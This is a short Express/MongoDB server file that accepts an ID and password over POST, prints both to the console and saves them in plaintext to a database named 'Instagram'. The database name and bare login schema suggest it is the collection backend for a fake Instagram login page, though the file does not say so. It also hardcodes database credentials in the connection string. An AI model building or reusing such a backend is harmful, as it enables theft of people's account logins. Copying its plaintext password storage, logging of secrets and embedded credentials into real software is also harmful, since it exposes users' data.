const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Connect to MongoDB
mongoose
  .connect(
    "mongodb+srv://sai123:sai123@propertycluster.we0bd.mongodb.net/Instagram?retryWrites=true&w=majority&appName=PropertyCluster",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.log(err));

// Schema and Model
const DataSchema = new mongoose.Schema({
  ID: String,
  password: String,
});

const Data = mongoose.model("Data", DataSchema);

// Routes
app.post("/api/data", async (req, res) => {
  const { ID, password } = req.body;
  console.log(ID, password);
  try {
    const newData = new Data({ ID, password });
    await newData.save();
    res.status(201).json({ message: "Data saved successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/hello", async (req, res) => {
  res.status(200).json({ message: "Hello from Vercel!" });
});

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
